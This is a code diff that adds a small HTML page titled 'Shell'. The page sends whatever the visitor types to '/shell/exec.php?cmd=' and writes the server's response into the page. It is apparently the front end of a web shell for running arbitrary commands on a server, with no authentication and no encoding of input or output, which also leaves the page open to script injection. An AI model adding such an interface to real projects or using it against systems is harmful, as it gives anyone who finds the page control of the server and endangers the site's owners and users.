@@ -1,0 +1,63 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Shell</title>
+  <style>
+    *{
+      padding: 0;
+      margin: 0;
+      box-sizing: border-box;
+      font-size: 18px;
+    }
+    .content{
+      width: 100vw;
+      height: calc(100vh - 50px);
+      overflow-y: scroll;
+      background-color: rgb(43, 43, 43);
+      color: white;
+      font-family: monospace;
+    }
+    .inputs{
+      height: 50px;
+      width: 100%;
+      display: flex;
+      flex-direction: row;
+      gap: 10px;
+      justify-content: space-around;
+      align-items: center;
+      background-color: black;
+    }
+    #cmd{
+      width: 85%;
+    }
+    #exec{
+      width: 10%;
+    }
+  </style>
+</head>
+<body>
+  <div class="content"></div>
+  <div class="inputs">
+    <input type="text" name="cmd" id="cmd">
+    <button id="exec">Execute</button>
+  </div>
+  <script>
+    let exec = document.querySelector("#exec");
+    exec.addEventListener("click", async ()=>{
+      let cmd = document.querySelector("#cmd").value;
+      let content = document.querySelector(".content");
+      if(cmd){
+        exec.setAttribute("disabled", true);
+        let res = await fetch("/shell/exec.php?cmd=" + cmd);
+        let html = await res.text();
+        exec.removeAttribute("disabled");
+        content.innerHTML += html;
+      }else{
+        alert("EMPTY COMMAND NOT ALLOWED");
+      }
+    })
+  </script>
+</body>
+</html>
